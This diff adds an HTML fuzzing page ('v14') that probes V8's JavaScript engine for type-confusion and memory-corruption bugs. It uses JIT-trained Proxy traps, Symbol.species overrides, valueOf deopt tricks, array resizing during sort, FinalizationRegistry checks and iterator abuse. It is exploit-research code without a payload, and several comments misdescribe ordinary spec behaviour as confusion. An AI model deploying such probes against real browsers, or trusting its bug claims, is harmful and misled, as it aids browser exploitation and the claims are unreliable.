@@ -1,0 +1,180 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>LOADING</title></head>
+<body><h3>v14</h3>
+<pre id="log" style="font-size:10px;background:#111;color:#0f0;padding:8px;max-height:700px;overflow:auto;white-space:pre-wrap;"></pre>
+<script>
+function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}
+var conv_ab=new ArrayBuffer(8);var conv_f64=new Float64Array(conv_ab);var conv_b64=new BigInt64Array(conv_ab);
+function dtoi(f){conv_f64[0]=f;return conv_b64[0];}
+
+async function fuzz(){
+  log('[*] v14 — JIT race + Proxy/Reflect + GC stress');
+
+  // === 1. Proxy trap handler type confusion ===
+  log('\n=== Proxy type confusion ===');
+  // V8 has had many bugs where Proxy handlers cause type confusion
+  // by returning unexpected types from traps
+  try{
+    let target=[1.1,2.2,3.3];
+    let handler={
+      get(t,p,r){
+        if(p==='length') return 3;
+        // Return object instead of number — may confuse JIT type specialization
+        if(typeof p==='string'&&!isNaN(p)){
+          // First many calls return number, then switch to object
+          if(fuzz.proxyCount++<10000) return t[p];
+          return {valueOf:()=>0xdeadbeef};
+        }
+        return Reflect.get(t,p,r);
+      }
+    };
+    fuzz.proxyCount=0;
+    let proxy=new Proxy(target,handler);
+
+    // Hot loop to trigger JIT with proxy
+    function hotLoop(arr){
+      let sum=0;
+      for(let i=0;i<arr.length;i++) sum+=arr[i];
+      return sum;
+    }
+    // Train with normal array
+    for(let i=0;i<50000;i++) hotLoop([1.1,2.2,3.3]);
+    // Now switch to proxy
+    let r=hotLoop(proxy);
+    log('[+] Proxy result after switch: '+r);
+    // Call again — this time proxy returns objects after 10k calls
+    fuzz.proxyCount=0;
+    for(let i=0;i<20000;i++){
+      try{r=hotLoop(proxy);}catch(e){break;}
+    }
+    log('[+] After 20k proxy calls: '+r+' type='+typeof r);
+  }catch(e){log('[!] Proxy: '+e.message.substring(0,100));}
+
+  // === 2. Species constructor confusion ===
+  log('\n=== Species constructor ===');
+  try{
+    class EvilArray extends Array{
+      static get[Symbol.species](){
+        // Return a constructor that creates a different type
+        return function(len){
+          return new Float64Array(len);
+        };
+      }
+    }
+    let ea=new EvilArray(1.1,2.2,3.3,4.4);
+    let mapped=ea.map(x=>x*2);
+    log('[+] Species map result type: '+mapped.constructor.name);
+    log('[+] Species map: '+mapped[0]+','+mapped[1]+','+mapped[2]);
+    // If V8 uses the species result but assumes Array, we get type confusion
+    if(mapped instanceof Float64Array){
+      log('[+] Got Float64Array from Array.map — species override worked');
+      // Now check if we can trick code that expects Array
+      let sliced=Array.prototype.slice.call(mapped);
+      log('[+] Slice of typed array: '+sliced.length+' '+typeof sliced[0]);
+    }
+  }catch(e){log('[!] Species: '+e.message.substring(0,100));}
+
+  // === 3. valueOf/toString deoptimization ===
+  log('\n=== valueOf deopt ===');
+  try{
+    let deoptCount=0;
+    let evil={
+      valueOf(){
+        deoptCount++;
+        if(deoptCount===50000){
+          // On the 50000th call, modify the array we're iterating
+          log('[*] valueOf triggered at count '+deoptCount);
+          return 0xCAFEBABE;
+        }
+        return 42;
+      }
+    };
+    function addLoop(a,b){return a+b;}
+    for(let i=0;i<100000;i++){
+      let r=addLoop(evil,evil);
+      if(r!==84&&i>50000){
+        log('[+] Unexpected result at i='+i+': '+r+' (0x'+(r>>>0).toString(16)+')');
+        break;
+      }
+    }
+    log('[+] valueOf deopt count: '+deoptCount);
+  }catch(e){log('[!] valueOf: '+e.message.substring(0,100));}
+
+  // === 4. Array sort with side effects ===
+  log('\n=== Array.sort comparator abuse ===');
+  try{
+    let arr=new Array(1024).fill(0).map((_,i)=>i);
+    let accessCount=0;
+    let sorted=arr.sort((a,b)=>{
+      accessCount++;
+      if(accessCount===5000){
+        // Modify array during sort
+        arr.length=1;
+        arr.length=1024;
+      }
+      return a-b;
+    });
+    log('[+] Sort with resize: sorted.length='+sorted.length+' accessCount='+accessCount);
+    // Check for uninitialized reads
+    let undef=0;
+    for(let i=0;i<sorted.length;i++) if(sorted[i]===undefined) undef++;
+    log('[+] Undefined entries: '+undef+' (if >0 may indicate uninit read)');
+  }catch(e){log('[!] Sort: '+e.message.substring(0,100));}
+
+  // === 5. WeakRef / FinalizationRegistry race ===
+  log('\n=== WeakRef/FinalizationRegistry ===');
+  try{
+    let leaked=null;
+    let fr=new FinalizationRegistry((held)=>{
+      log('[+] Callback fired! held='+held);
+      leaked=held;
+    });
+    {
+      let obj={data:new ArrayBuffer(1024)};
+      let weak=new WeakRef(obj);
+      fr.register(obj, obj.data); // register the ArrayBuffer as held value
+      obj=null;
+    }
+    // Force GC to collect obj
+    for(let i=0;i<10;i++){
+      new ArrayBuffer(0x1000000); // 16MB each, force major GC
+    }
+    // Check if callback fired
+    await new Promise(r=>setTimeout(r,100));
+    if(leaked){
+      log('[+] FinalizationRegistry leaked: '+leaked.constructor.name+' byteLength='+leaked.byteLength);
+      // The held value (ArrayBuffer) should still be valid
+      let view=new Uint8Array(leaked);
+      view[0]=0x42;
+      log('[+] Can write to finalized buffer: '+view[0]);
+    }else{
+      log('[*] No callback yet (GC may not have run)');
+    }
+  }catch(e){log('[!] WeakRef: '+e.message.substring(0,100));}
+
+  // === 6. Iterator protocol abuse ===
+  log('\n=== Iterator abuse ===');
+  try{
+    let itCount=0;
+    let evilIterator={
+      [Symbol.iterator](){
+        return{
+          next(){
+            itCount++;
+            if(itCount>100000) return{done:true};
+            if(itCount===50000){
+              // Change behavior mid-iteration
+              return{value:{toString(){return 'pwned'}},done:false};
+            }
+            return{value:itCount,done:false};
+          }
+        };
+      }
+    };
+    let result=[...evilIterator];
+    log('[+] Iterator: '+result.length+' items, item[49999]='+result[49999]);
+  }catch(e){log('[!] Iterator: '+e.message.substring(0,100));}
+
+  log('\n[*] v14 done.');
+}
+setTimeout(fuzz,500);
+</script></body></html>
